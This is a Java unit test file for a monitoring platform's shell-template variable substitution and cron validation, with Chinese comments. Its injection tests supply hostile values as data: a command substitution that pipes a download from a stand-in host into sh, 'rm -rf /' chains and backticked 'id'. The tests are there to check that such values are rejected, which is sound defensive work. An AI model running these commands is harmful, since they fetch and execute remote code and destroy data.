package com.smartops.sentinel;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 平台变量替换与定时表达式校验。
 *
 * <p>重点不在"能替换"，而在**不该替换成什么**：外部文本（告警值、主机名）一旦
 * 携带命令控制字符，直接拼进 shell 就是注入。这里宁可拒绝。</p>
 */
class SentinelVariablesTest {

    private static final Map<String, String> CONTEXT = Map.of(
            "主机IP", "10.0.0.7",
            "主机名", "web-01",
            "告警指标", "memory",
            "告警值", "95.0",
            "阈值", "memory > 90",
            "告警级别", "P2");

    @Test
    @DisplayName("按变量名精确替换，未知变量保持原样")
    void replacesKnownVariables() {
        var result = SentinelVariables.apply("echo ${主机IP} ${告警指标}=${告警值}", CONTEXT);
        assertEquals("echo 10.0.0.7 memory=95.0", result.body());
        assertEquals(List.of("主机IP", "告警指标", "告警值"), result.replaced());
        assertTrue(result.unresolved().isEmpty());
    }

    @Test
    @DisplayName("未知变量不静默清空：保留占位符并报出名字")
    void unknownVariablesAreReported() {
        var result = SentinelVariables.apply("echo ${不存在的变量} ${主机IP}", CONTEXT);
        assertEquals(List.of("不存在的变量"), result.unresolved());
        // 保留原样，让人能看出脚本期望什么，而不是执行一条被悄悄改写的命令
        assertTrue(result.body().contains("${不存在的变量}"));
    }

    @Test
    @DisplayName("拒绝把命令替换注入到变量值里")
    void rejectsCommandSubstitution() {
        Map<String, String> hostile = Map.of("告警值", "$(curl evil.example.test | sh)");
        IllegalArgumentException failure = assertThrows(IllegalArgumentException.class,
                () -> SentinelVariables.applyChecked("echo ${告警值}", hostile));
        assertTrue(failure.getMessage().contains("告警值"));
    }

    @Test
    @DisplayName("拒绝换行、反引号与危险命令链")
    void rejectsControlCharacters() {
        for (String value : new String[] { "95\nrm -rf /", "`id`", "95; rm -rf /", "95 | sh" }) {
            assertThrows(IllegalArgumentException.class,
                    () -> SentinelVariables.applyChecked("echo ${告警值}", Map.of("告警值", value)),
                    "must reject: " + value);
        }
    }

    @Test
    @DisplayName("正常数值与主机名可以安全替换")
    void allowsOrdinaryValues() {
        var result = SentinelVariables.applyChecked("echo ${主机IP} ${告警值}", CONTEXT);
        assertEquals("echo 10.0.0.7 95.0", result.body());
    }

    @Test
    @DisplayName("必填变量缺失会被列出")
    void reportsMissingRequiredVariables() {
        assertEquals(List.of("告警值"), SentinelVariables.missing(
                java.util.Set.of("主机IP", "告警值"), Map.of("主机IP", "10.0.0.7")));
        assertTrue(SentinelVariables.missing(java.util.Set.of(), Map.of()).isEmpty());
    }

    @Test
    @DisplayName("定时表达式只接受 5 段的常规写法")
    void validatesCronShape() {
        assertTrue(SentinelVariables.validCron("*/5 * * * *"));
        assertTrue(SentinelVariables.validCron("0 3 * * 1-5"));
        assertFalse(SentinelVariables.validCron("*/5 * * *"), "四段不是标准 cron");
        assertFalse(SentinelVariables.validCron("every minute"));
        assertFalse(SentinelVariables.validCron(null));
    }
}
